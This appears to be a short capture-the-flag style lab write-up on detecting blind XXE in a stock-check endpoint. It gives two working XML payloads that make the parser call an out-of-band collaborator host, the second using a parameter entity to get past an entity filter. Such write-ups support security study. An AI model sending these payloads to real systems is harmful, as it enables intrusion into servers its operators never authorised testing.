# Lab: Blind XXE with out-of-band interaction via XML parameter entities
## Description

First, attempted to detect the location of the Blind XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://77cgpbqnvjgmexmj5fiivfpia9gz4o.burpcollaborator.net/"> ]>
<stockCheck>
  <productId>4</productId>
  <storeId>&xxe;</storeId>
</stockCheck>
```
Above returned: `"Entities are not allowed for security reasons"`

## Solution
To bypass the block of entities, I stored the entitry in an XML parameter instead:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://6u1fcadmii3l1w9ise5hiechx83zro.burpcollaborator.net"> %xxe; ]>
<stockCheck>
  <productId>4</productId>
  <storeId>%xxe;</storeId>
</stockCheck>
```
Above returned: `"Parsing error"` but successfully triggered a request to the collaboration server. We now have our blind XXE.
